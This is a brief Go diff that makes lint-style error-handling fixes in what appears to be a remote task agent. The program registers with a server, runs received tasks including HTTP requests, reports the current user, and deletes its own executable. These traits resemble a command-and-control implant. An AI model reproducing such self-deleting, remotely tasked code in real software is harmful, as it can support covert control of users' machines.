@@ -102,7 +102,7 @@ func runOnce() error {
 	if err != nil {
 		return err
 	}
-	defer conn.Close()
+	defer func() { _ = conn.Close() }()
 
 	reg, _ := json.Marshal(map[string]any{
 		"type":         "register",
@@ -237,7 +237,7 @@ func handleTask(ctx context.Context, msg inMsg) outMsg {
 		if err != nil {
 			execErr = err.Error()
 		} else {
-			defer resp.Body.Close()
+			defer func() { _ = resp.Body.Close() }()
 			body, _ := io.ReadAll(resp.Body)
 			data = map[string]any{
 				"status": resp.StatusCode,
@@ -276,7 +276,7 @@ func currentUser() string {
 
 func selfDelete() {
 	if p, err := os.Executable(); err == nil {
-		os.Remove(p)
+		_ = os.Remove(p)
 	}
 }
 
